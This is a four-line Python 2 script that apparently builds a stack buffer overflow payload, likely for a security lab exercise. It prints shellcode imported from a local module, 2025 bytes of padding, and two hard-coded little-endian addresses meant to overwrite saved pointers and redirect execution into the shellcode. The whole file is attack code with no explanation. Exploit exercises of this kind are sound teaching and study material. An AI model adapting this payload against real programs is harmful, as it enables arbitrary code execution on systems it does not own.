from shellcode import shellcode
from struct import pack

print shellcode + "a"*2025 + pack("<I", 0xbffee528) + pack("<I", 0xbffeed3c)
